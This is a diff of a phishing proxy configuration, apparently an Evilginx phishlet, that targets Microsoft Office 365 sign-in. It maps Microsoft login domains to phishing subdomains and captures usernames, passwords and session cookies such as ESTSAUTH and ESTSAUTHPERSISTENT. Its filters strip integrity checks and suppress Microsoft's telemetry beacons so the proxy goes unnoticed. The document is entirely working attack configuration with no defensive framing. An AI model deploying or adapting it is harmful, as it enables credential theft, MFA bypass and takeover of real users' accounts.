@@ -1,36 +1,34 @@
 name: 'o365'
-author: '@manan'
-min_ver: '3.0.0'
-
+author: "@manan"
+min_ver: '3.2.0'
+redirect_url: 'https://office.com'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
-  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
-  - {phish_sub: 'live', orig_sub: 'login', domain: 'live.com', session: false, auto_filter: true, is_landing:false}
-  - {phish_sub: 'device.login', orig_sub: 'device.login', domain: 'microsoftonline.com', session: true, is_landing:true}
-  - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: false, is_landing:true}
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing:true}
-
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'account-live', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: 'events', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
 
 sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'f\.send\(e\.data\)', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'f\.send\(e\.data\)', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'try{g\.sendPOST\(n,i,a\),e\.sendListener&&e\.sendListener\(A,n,a,t\.isBeacon\)}', replace: 'try{return;}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth', search: 'try{g\.sendPOST\(n,i,a\),e\.sendListener&&e\.sendListener\(A,n,a,t\.isBeacon\)}', replace: 'try{return;}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+
+auth_urls:
+  - '/kmsi*'
 
 auth_tokens:
-  - domain: 'www.office.com'
-    keys: ['.*,regexp']
-    type: 'cookie'
-  - domain: '.office.com'
-    keys: ['.*,regexp']
-    type: 'cookie'
   - domain: '.login.microsoftonline.com'
-    keys: ['.*,regexp']
-    type: 'cookie'
-  - domain: 'login.microsoftonline.com'
-    keys: ['.*,regexp']
-    type: 'cookie'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'CCState', 'buid', 'esctx', 'fpc']
   - domain: '.microsoftonline.com'
-    keys: ['.*,regexp']
-    type: 'cookie'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'CCState', 'x-ms-gateway-slice', 'stsservicecookie']
 
 credentials:
   username:
@@ -41,24 +39,7 @@ credentials:
     key: 'passwd'
     search: '(.*)'
     type: 'post'
-
+    
 login:
   domain: 'login.microsoftonline.com'
   path: '/'
-
-auth_urls:
-  - '/common/login'
-
-force_post:
-  - path: '/kmsi'
-    search:
-      - {key: 'LoginOptions', search: '.*'}
-    force:
-      - {key: 'LoginOptions', value: '1'}
-    type: 'post'
-  - path: '/common/SAS'
-    search:
-      - {key: 'rememberMFA', search: '.*'}
-    force:
-      - {key: 'rememberMFA', value: 'true'}
-    type: 'post'
